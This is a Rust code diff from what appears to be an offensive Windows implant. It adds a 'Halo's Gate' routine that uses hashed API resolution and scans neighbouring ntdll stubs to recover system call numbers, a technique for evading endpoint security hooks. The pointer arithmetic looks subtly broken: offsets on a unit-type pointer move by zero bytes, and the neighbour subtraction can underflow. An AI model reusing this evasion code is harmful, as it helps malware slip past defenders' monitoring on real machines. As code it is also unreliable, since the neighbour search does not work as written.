@@ -209,8 +209,6 @@ use crate::utils::api_resolver::{hash_str, resolve_function};
 
 #[cfg(target_os = "windows")]
 pub unsafe fn get_ssn(function_hash: u32) -> u16 {
-    // 1. Get ntdll base implicitly via resolve_function (which walks all modules)
-    // Note: resolve_function takes module_hash.
     let ntdll_hash = hash_str(b"ntdll.dll");
     let addr = resolve_function(ntdll_hash, function_hash);
 
@@ -218,18 +216,37 @@ pub unsafe fn get_ssn(function_hash: u32) -> u16 {
         return 0;
     }
 
-    // 2. Read SSN
+    // Try current function
+    if let Some(ssn) = check_stub(addr) {
+        return ssn;
+    }
+
+    // Halo's Gate: Check neighbors
+    for i in 1..32 {
+        // Check neighbor above
+        if let Some(ssn) = check_stub(addr.add(i * 32)) {
+            return ssn - i as u16;
+        }
+        // Check neighbor below
+        if let Some(ssn) = check_stub(addr.sub(i * 32)) {
+            return ssn + i as u16;
+        }
+    }
+
+    0
+}
+
+#[cfg(target_os = "windows")]
+unsafe fn check_stub(addr: *const ()) -> Option<u16> {
+    let p = addr as *const u8;
     // Pattern: mov r10, rcx; mov eax, <SSN>
     // Bytes: 4c 8b d1 b8 <SSN_LOW> <SSN_HIGH> 00 00
-    let p = addr as *const u8;
     if *p == 0x4c && *p.add(1) == 0x8b && *p.add(2) == 0xd1 && *p.add(3) == 0xb8 {
         let ssn_low = *p.add(4) as u16;
         let ssn_high = *p.add(5) as u16;
-        return (ssn_high << 8) | ssn_low;
+        return Some((ssn_high << 8) | ssn_low);
     }
-
-    // Fallback: Check neighbors (Halo's Gate) - Simplified stub
-    0
+    None
 }
 
 #[cfg(target_os = "windows")]
